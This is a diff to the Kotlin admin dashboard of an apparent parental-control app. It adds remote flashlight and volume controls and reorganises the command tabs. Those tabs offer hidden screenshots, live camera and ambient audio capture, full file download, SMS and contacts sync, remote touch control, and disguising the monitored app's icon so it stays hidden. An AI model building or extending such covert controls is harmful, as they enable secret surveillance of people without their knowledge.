@@ -1060,8 +1060,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                             listOf(
                                 Triple(0, Icons.Default.Home, "الرئيسية"),
                                 Triple(1, Icons.Default.GridView, "الأوامر"),
-                                Triple(2, Icons.Default.PhotoLibrary, "الوسائط"),
-                                Triple(3, Icons.Default.Folder, "الملفات")
+                                Triple(2, Icons.Default.Folder, "الملفات")
                             ).forEach { (index, icon, label) ->
                                 val isSelected = bottomNavSelectedTab == index
                                 val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
@@ -1197,8 +1196,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                     when (bottomNavSelectedTab) {
                         0 -> DeviceHomeTab(activeDevice, viewModel)
                         1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
-                        2 -> DeviceMediaGalleryTab(viewModel)
-                        3 -> DeviceFilesExplorerTab(viewModel)
+                        2 -> DeviceFilesExplorerTab(viewModel)
                     }
                 }
             }
@@ -1925,6 +1923,81 @@ fun DeviceHomeTab(device: Device, viewModel: AdminViewModel) {
                 }
             }
         }
+
+        // التحكم في فلاش الهاتف (الكشاف) المدمج في الرئيسية
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
+            shape = RoundedCornerShape(20.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
+            border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
+            modifier = Modifier.fillMaxWidth().shadow(
+                elevation = 8.dp, 
+                shape = RoundedCornerShape(20.dp), 
+                spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
+                ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
+            )
+        ) {
+            Column(modifier = Modifier.padding(14.dp)) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(
+                        imageVector = Icons.Default.Bolt,
+                        contentDescription = null,
+                        tint = Color(0xFFFBC02D),
+                        modifier = Modifier.size(24.dp)
+                    )
+                    Spacer(modifier = Modifier.width(12.dp))
+                    Column {
+                        Text("التحكم في فلاش الهاتف عن بعد", color = Color(0xFF111827), fontSize = 14.sp, fontWeight = FontWeight.Bold)
+                        Text("تشغيل أو إطفاء كشاف الهاتف في أي وقت للسلامة والمتابعة", color = Color(0xFF6B7280), fontSize = 11.sp, fontWeight = FontWeight.Medium)
+                    }
+                }
+                Spacer(modifier = Modifier.height(16.dp))
+                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
+                    Button(
+                        onClick = { viewModel.turnOnFlashlight() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
+                        contentPadding = PaddingValues(),
+                        shape = RoundedCornerShape(12.dp),
+                        modifier = Modifier.weight(1f).height(44.dp)
+                    ) {
+                        Box(
+                            modifier = Modifier
+                                .fillMaxSize()
+                                .background(Brush.linearGradient(listOf(Color(0xFF4CAF50), Color(0xFF2E7D32))))
+                                .padding(horizontal = 16.dp, vertical = 8.dp),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(Icons.Default.FlashOn, null, modifier = Modifier.size(16.dp), tint = Color.White)
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("اشعل الفلاش", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.White)
+                            }
+                        }
+                    }
+                    Button(
+                        onClick = { viewModel.turnOffFlashlight() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
+                        contentPadding = PaddingValues(),
+                        shape = RoundedCornerShape(12.dp),
+                        modifier = Modifier.weight(1f).height(44.dp)
+                    ) {
+                        Box(
+                            modifier = Modifier
+                                .fillMaxSize()
+                                .background(Brush.linearGradient(listOf(Color(0xFFEF4444), Color(0xFFC62828))))
+                                .padding(horizontal = 16.dp, vertical = 8.dp),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(Icons.Default.FlashOff, null, modifier = Modifier.size(16.dp), tint = Color.White)
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("إطفاء الفلاش", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.White)
+                            }
+                        }
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -1947,13 +2020,15 @@ fun DeviceCommandsTab(
             
             val cmdItems = listOf(
                 CommandItemInfo("screenshot", "لقطة الشاشة والكاميرات", "التقاط لقطة شاشة هاتف الطفل أو صور حية بالكاميرا", Icons.Default.Screenshot, Color(0xFF9155FF)),
+                CommandItemInfo("media_gallery", "معرض الوسائط والملفات", "استعراض الصور، الفيديوهات والتسجيلات المكتشفة", Icons.Default.PhotoLibrary, Color(0xFF3F51B5)),
                 CommandItemInfo("audio_record", "تسجيل الصوت المحيطي", "تسجيل مقطع صوتي محيطي بالوقت الحقيقي والاستماع إليه", Icons.Default.Mic, Color(0xFF00E5FF)),
                 CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
                 CommandItemInfo("apps", "قائمة التطبيقات وحزمها", "الاطلاع وفلترة التطبيقات المنصبة على الهاتف للأمان", Icons.Default.Apps, Color(0xFFFF4081)),
                 CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100)),
                 CommandItemInfo("contacts", "سجل جهات الاتصال", "عرض الأسماء والأرقام المسجلة في هاتف الطفل", Icons.Default.ContactPhone, Color(0xFF9155FF)),
                 CommandItemInfo("remote_control", "التحكم عن بعد (لمس)", "بث مباشر للشاشة مع إمكانية التحكم الكامل باللمس", Icons.Default.SettingsRemote, Color(0xFF2196F3)),
-                CommandItemInfo("audio_control", "التحكم في الصوت والتنبيه", "تشغيل أصوات تنبيهية والتحكم في مستوى صوت هاتف الطفل", Icons.Default.VolumeUp, Color(0xFFFFA726)),
+                CommandItemInfo("volume_control", "التحكم في الصوت", "التحكم في مستوى صوت هاتف الطفل وتعديله عن بعد", Icons.Default.VolumeUp, Color(0xFFFFA726)),
+                CommandItemInfo("audio_control", "تشغيل الأصوات التنبيهية", "تشغيل أصوات تنبيهية وتنبيهات حية مسبقة على هاتف الطفل", Icons.Default.MusicNote, Color(0xFFE040FB)),
                 CommandItemInfo("send_message", "إرسال رسالة فورية", "إرسال رسالة تظهر كإشعار على هاتف الطفل", Icons.Default.Chat, Color(0xFF00C853)),
                 CommandItemInfo("change_icon", "استبدال أيقونة التطبيق", "تغيير شكل واسم أيقونة تطبيق الطفل من ضمن القائمة", Icons.Default.Apps, Color(0xFFE91E63))
             )
@@ -1997,6 +2072,7 @@ fun DeviceCommandsTab(
             Box(modifier = Modifier.weight(1f).fillMaxWidth()) {
                 when (openCommandDetails) {
                     "screenshot" -> ScreenshotRequirementsPage(viewModel)
+                    "media_gallery" -> DeviceMediaGalleryTab(viewModel)
                     "audio_record" -> AudioRecordRequirementsPage(viewModel)
                     "live_stream" -> LiveStreamRequirementsPage(viewModel)
                     "file_explorer" -> RemoteFileExplorerTab(viewModel)
@@ -2004,6 +2080,7 @@ fun DeviceCommandsTab(
                     "sms" -> SmsAndSecurityAlertsTab(viewModel)
                     "contacts" -> ContactsTab(viewModel)
                     "remote_control" -> RemoteControlTab(viewModel)
+                    "volume_control" -> VolumeControlTab(viewModel)
                     "audio_control" -> AudioControlTab(viewModel)
                     "send_message" -> NotificationTab(viewModel)
                     "camera_live" -> CameraLiveTab(viewModel)
@@ -2534,8 +2611,74 @@ fun RemoteControlTab(viewModel: AdminViewModel) {
 }
 
 @Composable
-fun AudioControlTab(viewModel: AdminViewModel) {
+fun VolumeControlTab(viewModel: AdminViewModel) {
     var volume by remember { mutableFloatStateOf(50f) }
+    var confirmedVolume by remember { mutableFloatStateOf(50f) }
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(14.dp),
+        verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
+            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Text("التحكم في مستوى صوت الهاتف عن بعد", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                Spacer(modifier = Modifier.height(16.dp))
+                
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(Icons.Default.VolumeMute, "صامت", tint = Color(0xFF6B7280))
+                    Slider(
+                        value = volume,
+                        onValueChange = { volume = it },
+                        valueRange = 0f..100f,
+                        modifier = Modifier.weight(1f),
+                        colors = SliderDefaults.colors(
+                            thumbColor = Color(0xFFFFA726),
+                            activeTrackColor = Color(0xFFFFA726)
+                        )
+                    )
+                    Icon(Icons.Default.VolumeUp, "مرتفع", tint = Color(0xFFFFA726))
+                }
+                Text("مستوى الصوت المروّس الحالي: ${volume.toInt()}%", color = Color(0xFF6B7280), fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))
+
+                val hasVolumeChanged = volume.toInt() != confirmedVolume.toInt()
+                if (hasVolumeChanged) {
+                    Spacer(modifier = Modifier.height(16.dp))
+                    Button(
+                        onClick = {
+                            viewModel.setRemoteVolume(volume.toInt())
+                            confirmedVolume = volume
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFFA726)),
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(Icons.Default.Check, contentDescription = "تأكيد")
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("تأكيد ضبط الصوت", fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                    }
+                }
+            }
+        }
+        
+        Text(
+            "ضبط مستوى الصوت عن بعد يقوم بتغيير مستوى صوت رنين وسائط هاتف الطفل بالوقت الحقيقي.",
+            color = Color(0xFF6B7280),
+            fontSize = 12.sp,
+            textAlign = TextAlign.Center,
+            modifier = Modifier.padding(horizontal = 8.dp)
+        )
+    }
+}
+
+@Composable
+fun AudioControlTab(viewModel: AdminViewModel) {
     var playVolume by remember { mutableFloatStateOf(80f) }
     var soundName by remember { mutableStateOf("") }
     var expanded by remember { mutableStateOf(false) }
@@ -2574,7 +2717,10 @@ fun AudioControlTab(viewModel: AdminViewModel) {
     }
 
     Column(
-        modifier = Modifier.fillMaxSize().padding(14.dp),
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(14.dp),
         verticalArrangement = Arrangement.spacedBy(16.dp)
     ) {
         Card(
@@ -2583,36 +2729,8 @@ fun AudioControlTab(viewModel: AdminViewModel) {
             modifier = Modifier.fillMaxWidth()
         ) {
             Column(modifier = Modifier.padding(16.dp)) {
-                Text("التحكم في مستوى الصوت", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 14.sp)
-                Spacer(modifier = Modifier.height(16.dp))
-                
-                Row(verticalAlignment = Alignment.CenterVertically) {
-                    Icon(Icons.Default.VolumeMute, "صامت", tint = Color(0xFF6B7280))
-                    Slider(
-                        value = volume,
-                        onValueChange = { volume = it },
-                        onValueChangeFinished = { viewModel.setRemoteVolume(volume.toInt()) },
-                        valueRange = 0f..100f,
-                        modifier = Modifier.weight(1f),
-                        colors = SliderDefaults.colors(
-                            thumbColor = Color(0xFFFFA726),
-                            activeTrackColor = Color(0xFFFFA726)
-                        )
-                    )
-                    Icon(Icons.Default.VolumeUp, "مرتفع", tint = Color(0xFFFFA726))
-                }
-                Text("المستوى الحالي: ${volume.toInt()}%", color = Color(0xFF6B7280), fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))
-            }
-        }
-
-        Card(
-            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
-            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
-            modifier = Modifier.fillMaxWidth()
-        ) {
-            Column(modifier = Modifier.padding(16.dp)) {
                 Text(
-                    text = "تشغيل أصوات تنبيهية", 
+                    text = "تشغيل أصوات تنبيهية على هاتف الطفل", 
                     color = Color(0xFF1F2937), 
                     fontWeight = FontWeight.Bold, 
                     fontSize = 14.sp
@@ -2630,19 +2748,39 @@ fun AudioControlTab(viewModel: AdminViewModel) {
                             value = soundName,
                             onValueChange = { },
                             readOnly = true,
-                            label = { Text("اختر الصوت المتوفر") },
+                            label = { 
+                                Text(
+                                    text = "اختر الصوت المتوفر", 
+                                    color = Color(0xFF334155), 
+                                    fontWeight = FontWeight.Bold, 
+                                    fontSize = 12.sp
+                                ) 
+                            },
+                            textStyle = androidx.compose.ui.text.TextStyle(
+                                color = Color(0xFF0F172A),
+                                fontWeight = FontWeight.Bold,
+                                fontSize = 14.sp
+                            ),
                             modifier = Modifier.fillMaxWidth(),
                             trailingIcon = {
                                 IconButton(onClick = { expanded = !expanded }) {
                                     Icon(
                                         imageVector = if (expanded) Icons.Default.ArrowDropUp else Icons.Default.ArrowDropDown,
-                                        contentDescription = "قائمة الأصوات"
+                                        contentDescription = "قائمة الأصوات",
+                                        tint = Color(0xFF1E88E5),
+                                        modifier = Modifier.size(24.dp)
                                     )
                                 }
                             },
                             colors = OutlinedTextFieldDefaults.colors(
-                                focusedBorderColor = Color(0xFF2196F3),
-                                unfocusedBorderColor = Color(0xFFE5E7EB)
+                                focusedBorderColor = Color(0xFF1E88E5),
+                                unfocusedBorderColor = Color(0xFF64748B),
+                                focusedLabelColor = Color(0xFF0F172A),
+                                unfocusedLabelColor = Color(0xFF334155),
+                                focusedContainerColor = Color(0xFFF8FAFC),
+                                unfocusedContainerColor = Color(0xFFFFFFFF),
+                                focusedTextColor = Color(0xFF0F172A),
+                                unfocusedTextColor = Color(0xFF0F172A)
                             ),
                             shape = RoundedCornerShape(12.dp)
                         )
@@ -2655,22 +2793,63 @@ fun AudioControlTab(viewModel: AdminViewModel) {
                         DropdownMenu(
                             expanded = expanded,
                             onDismissRequest = { expanded = false },
-                            modifier = Modifier.fillMaxWidth(0.9f)
+                            modifier = Modifier
+                                .fillMaxWidth(0.9f)
+                                .background(Color(0xFF1E293B), shape = RoundedCornerShape(16.dp))
+                                .border(1.5.dp, Color(0xFF2196F3), shape = RoundedCornerShape(16.dp))
                         ) {
                             if (availableSounds.isEmpty()) {
                                 DropdownMenuItem(
-                                    text = { Text("لا توجد أصوات محملة، انقر على جلب") },
+                                    text = {
+                                        Row(verticalAlignment = Alignment.CenterVertically) {
+                                            Icon(
+                                                imageVector = Icons.Default.Info,
+                                                contentDescription = null,
+                                                tint = Color(0xFF94A3B8),
+                                                modifier = Modifier.size(16.dp)
+                                            )
+                                            Spacer(modifier = Modifier.width(8.dp))
+                                            Text(
+                                                text = "لا توجد أصوات محملة، انقر على جلب",
+                                                color = Color(0xFF94A3B8),
+                                                fontSize = 12.sp,
+                                                fontWeight = FontWeight.Medium
+                                            )
+                                        }
+                                    },
                                     onClick = { expanded = false },
-                                    enabled = false
+                                    enabled = false,
+                                    colors = androidx.compose.material3.MenuDefaults.itemColors(
+                                        disabledTextColor = Color(0xFF94A3B8)
+                                    )
                                 )
                             } else {
                                 availableSounds.forEach { sound ->
                                     DropdownMenuItem(
-                                        text = { Text(sound) },
+                                        text = {
+                                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                                Icon(
+                                                    imageVector = Icons.Default.MusicNote,
+                                                    contentDescription = null,
+                                                    tint = Color(0xFFFFA726),
+                                                    modifier = Modifier.size(16.dp)
+                                                )
+                                                Spacer(modifier = Modifier.width(8.dp))
+                                                Text(
+                                                    text = sound,
+                                                    color = Color.White,
+                                                    fontWeight = FontWeight.Bold,
+                                                    fontSize = 14.sp
+                                                )
+                                            }
+                                        },
                                         onClick = {
                                             soundName = sound
                                             expanded = false
-                                        }
+                                        },
+                                        colors = androidx.compose.material3.MenuDefaults.itemColors(
+                                            textColor = Color.White
+                                        )
                                     )
                                 }
                             }
@@ -2775,6 +2954,29 @@ fun AudioControlTab(viewModel: AdminViewModel) {
             }
         }
         
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFF9FAFB)),
+            border = BorderStroke(1.5.dp, Color(0xFFE5E7EB)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(14.dp)) {
+                Text(
+                    text = "الشكل المرسل لتطبيق الطفل (Payload):",
+                    color = Color(0xFF374151),
+                    fontWeight = FontWeight.Bold,
+                    fontSize = 12.sp
+                )
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    text = "Command: \"play_remote_sound\"\nParameters:\n{\n  \"Sound\": \"${if (soundName.isBlank()) "alarm" else soundName}\",\n  \"Volume\": ${playVolume.toInt()},\n  \"volume\": ${playVolume.toInt()}\n}",
+                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+                    color = Color(0xFF0284C7),
+                    fontSize = 11.sp,
+                    lineHeight = 16.sp
+                )
+            }
+        }
+
         Text(
             "هذه الميزة تسمح لك بلفت انتباه الطفل أو العثور على الجهاز المفقود عبر تشغيل أصوات مرتفعة عن بعد.",
             color = Color(0xFF6B7280),
@@ -2786,12 +2988,97 @@ fun AudioControlTab(viewModel: AdminViewModel) {
 }
 
 @Composable
+fun FlashlightControlTab(viewModel: AdminViewModel) {
+    Column(
+        modifier = Modifier.fillMaxSize().padding(14.dp),
+        verticalArrangement = Arrangement.spacedBy(16.dp),
+        horizontalAlignment = Alignment.CenterHorizontally
+    ) {
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
+            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                Icon(
+                    imageVector = Icons.Default.Bolt,
+                    contentDescription = "الفلاش",
+                    tint = Color(0xFFFBC02D),
+                    modifier = Modifier.size(48.dp)
+                )
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("التحكم في فلاش الهاتف عن بعد", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    "يمكنك تشغيل الكشاف (الفلاش) أو إطفاؤه في أي وقت للسلامة والمتابعة.",
+                    color = Color(0xFF4B5563),
+                    fontSize = 12.sp,
+                    textAlign = TextAlign.Center,
+                    lineHeight = 18.sp
+                )
+                Spacer(modifier = Modifier.height(24.dp))
+                
+                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
+                    Button(
+                        onClick = { viewModel.turnOnFlashlight() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50)),
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(Icons.Default.FlashOn, null)
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("اشعل الفلاش", fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                    }
+                    
+                    Button(
+                        onClick = { viewModel.turnOffFlashlight() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(Icons.Default.FlashOff, null)
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("إطفاء الفلاش", fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                    }
+                }
+            }
+        }
+
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFF9FAFB)),
+            border = BorderStroke(1.5.dp, Color(0xFFE5E7EB)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(14.dp)) {
+                Text(
+                    text = "الأمر المرسل لتطبيق الطفل (Flash Commands):",
+                    color = Color(0xFF374151),
+                    fontWeight = FontWeight.Bold,
+                    fontSize = 12.sp
+                )
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    text = "عند التشغيل: \"flash_on\"\nعند الإطفاء: \"flash_off\"",
+                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+                    color = Color(0xFF0284C7),
+                    fontSize = 11.sp,
+                    lineHeight = 16.sp
+                )
+            }
+        }
+    }
+}
+
+@Composable
 fun NotificationTab(viewModel: AdminViewModel) {
     var title by remember { mutableStateOf("تنبيه من الوالدين") }
     var message by remember { mutableStateOf("") }
     
     Column(
-        modifier = Modifier.fillMaxSize().padding(16.dp),
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(16.dp),
         verticalArrangement = Arrangement.spacedBy(16.dp)
     ) {
         Card(
@@ -3168,7 +3455,13 @@ fun ChangeIconRequirementsPage(viewModel: AdminViewModel) {
         Triple("icon3", "name3", "icon3")
     )
 
-    Column(modifier = Modifier.fillMaxSize().padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(14.dp),
+        verticalArrangement = Arrangement.spacedBy(10.dp)
+    ) {
         Text("استبدال أيقونة وتسمية تطبيق الطفل", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
         Text("اختر أيقونة ومسمى بديل لتغيير مظهر تطبيق الطفل بهدف إخفائه بشكل فعال.", color = Color(0xFF6B7280), fontSize = 12.sp)
 
@@ -3188,8 +3481,8 @@ fun ChangeIconRequirementsPage(viewModel: AdminViewModel) {
                         val extensions = listOf(".png", ".jpg", ".jpeg", "")
                         for (ext in extensions) {
                             try {
-                                val st = context.assets.open(filename + ext)
-                                bmp = android.graphics.BitmapFactory.decodeStream(st)
+                                val sst = context.assets.open(filename + ext)
+                                bmp = android.graphics.BitmapFactory.decodeStream(sst)
                                 if (bmp != null) break
                             } catch (e: Exception) {
                                 // ignore
@@ -3216,7 +3509,7 @@ fun ChangeIconRequirementsPage(viewModel: AdminViewModel) {
             }
         }
 
-        Spacer(modifier = Modifier.weight(1f))
+        Spacer(modifier = Modifier.height(24.dp))
         
         Button(
             onClick = {
